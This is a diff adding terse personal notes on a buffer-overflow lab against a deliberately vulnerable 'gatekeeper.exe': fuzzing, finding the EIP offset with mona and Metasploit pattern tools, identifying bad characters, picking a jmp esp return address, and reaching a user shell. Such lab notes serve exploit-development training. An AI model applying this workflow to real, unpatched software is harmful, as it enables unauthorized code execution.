@@ -112,3 +112,48 @@ Log data, item 11
  Address=625014DF
  Message=  0x625014df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\win7.INVID\Desktop\vulnerable-apps\chat server\essfunc.dll)
 
+##Gatekeepe
+SMB
+
+gatekepper.exe
+
+python2 ./fuzz.py 
+Fuzzing hello 100 bytes
+Fuzzing hello 200 bytes
+
+msf-pattern_create -l 500
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
+
+!mona findmsp -distance 500
+
+Log data, item 22
+ Address=0BADF00D
+ Message=    EIP contains normal pattern : 0x39654138 (offset 146)
+
+!mona bytearray -b "\x00"
+
+!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 016A19F8
+
+Log data, item 4
+ Address=016A19F8
+ Message=Possibly bad chars: 0b
+
+!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 014E19F8
+
+Bad Characters
+!mona bytearray -b "\x00\x0a\x0b"
+
+!mona jmp -r esp -cpb "\x00\x01\x0b"
+
+Log data, item 4
+ Address=080414C3
+ Message=  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\win7.INVID\Desktop\vulnerable-apps\gatekeeper\gatekeeper.exe)
+
+Log data, item 3
+ Address=080416BF
+ Message=  0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\win7.INVID\Desktop\vulnerable-apps\gatekeeper\gatekeeper.exe)
+
+\xbf\x16\x04\x08
+
+User Shell
